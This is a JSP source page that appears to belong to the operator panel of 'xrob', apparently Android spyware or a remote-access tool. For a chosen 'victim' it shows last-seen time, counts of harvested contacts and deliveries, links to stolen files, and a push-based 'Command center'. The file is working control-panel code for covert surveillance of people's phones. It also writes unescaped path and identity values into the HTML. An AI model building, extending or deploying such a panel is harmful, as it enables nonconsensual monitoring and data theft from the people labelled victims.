<%@ page import="com.theah64.xrob.api.models.Victim" %>
<%@ page import="java.util.List" %>
<%@ page import="com.theah64.xrob.api.utils.CommonUtils" %>
<%@ page import="com.theah64.xrob.api.utils.clientpanel.PathInfo" %>
<%@ page import="com.theah64.xrob.api.database.tables.*" %>
<%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
<%--
  Created by IntelliJ IDEA.
  User: theapache64
  Date: 12/9/16
  Time: 4:08 PM
  To change this template use FileNode | Settings | FileNode Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@include file="../signin_check.jsp" %>

<html>
<head>
    <%

    %>
    <title>Victims</title>
    <%@include file="../../common_headers.jsp" %>
    <script>
        $(document).ready(function () {
            $(".inactive").click(function () {
                alert("Command center not available for this victim");
            });
        });
    </script>

</head>
<body>
<div class="container">
    <%@include file="../header.jsp" %>

    <%
        try {

            final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 1, 1);
            final String victimCode = pathInfoUtils.getPart(1);
            final Victims victimsTable = Victims.getInstance();
            final Victim theVictim = victimsTable.get(Victims.COLUMN_VICTIM_CODE, victimCode);

            if (theVictim != null) {

                if (ClientVictimRelations.getInstance().isConnected(clientId.toString(), theVictim.getId())) {

                    final String lastDelivery = Deliveries.getInstance().getLastDeliveryTime(null, theVictim.getId());

    %>

    <div class="row text-center">
        <ul id="nav_menu" class="breadcrumb">
            <li><a href="/client/panel">Victims</a></li>
            <li class="active"><%=theVictim.getIdentity()%>
            </li>
        </ul>
    </div>


    <div class="row">

        <div class="row">
            <div class="col-md-12">
                <h4><%=theVictim.getIdentity()%>
                    <small>
                        <%=lastDelivery == null ? "(Not yet seen)" : "(last seen: " + lastDelivery + ")" %>
                    </small>
                </h4>

            </div>
        </div>

        <div class="row" style="margin-top: 20px;">

            <%--Contacts--%>
            <div class="col-lg-3">
                <a href="/client/victim/contacts/<%=victimCode%>">
                    <div class="profile_grid">
                        <p class="profile_grid_main_title"><%=Contacts.getInstance().getTotal(theVictim.getId())%>
                        </p>

                        <p class="profile_grid_sub_title">Contacts</p>
                    </div>
                </a>
            </div>

            <%--Deliveries--%>
            <div class="col-lg-3">
                <a href="/client/victim/deliveries/<%=victimCode%>">
                    <div class="profile_grid">
                        <p class="profile_grid_main_title"><%=Deliveries.getInstance().getTotal(theVictim.getId())%>
                        </p>

                        <p class="profile_grid_sub_title">Deliveries</p>
                    </div>
                </a>
            </div>


            <%--BaseCommand center--%>
            <div class="col-lg-3">
                <a href="<%=theVictim.getFCMId()!=null ?"/client/victim/command_center/" + victimCode : "#" %>">
                    <div class="profile_grid <%=theVictim.getFCMId()==null ? "inactive" : ""%>">
                        <p class="profile_grid_main_title">C
                        </p>

                        <p class="profile_grid_sub_title">Command center</p>
                    </div>
                </a>
            </div>

            <%--Files--%>
            <div class="col-lg-3">
                <a href="/client/victim/files/<%=victimCode%>">
                    <div class="profile_grid">
                        <p class="profile_grid_main_title">F
                        </p>

                        <p class="profile_grid_sub_title">Files</p>
                    </div>
                </a>
            </div>


        </div>

        <%

            } else {
                throw new PathInfo.PathInfoException("No connection established with this victim");
            }

        %>
    </div>


    <%
        } else {
            throw new PathInfo.PathInfoException("Invalid victim code " + victimCode);
        }
    } catch (PathInfo.PathInfoException e) {
        e.printStackTrace();
    %>
    <%=HtmlTemplates.getErrorHtml(e.getMessage())%>
    <%
        }
    %>


</div>
</body>
</html>
